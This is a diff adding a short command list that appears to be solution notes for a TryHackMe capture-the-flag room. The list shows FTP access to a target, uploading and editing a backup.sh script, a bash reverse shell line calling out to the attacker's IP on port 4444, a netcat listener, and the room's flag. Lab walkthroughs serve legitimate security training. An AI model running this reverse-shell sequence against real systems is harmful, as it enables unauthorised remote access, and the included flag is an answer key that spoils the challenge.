@@ -1,0 +1,9 @@
+ftp <targetip>
+ls
+cd public
+get shoppinglist.txt
+put backup.sh
+sudo nano backup.sh
+bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1
+nc -lvnp 4444
+THM{even_you_can_be_santa}
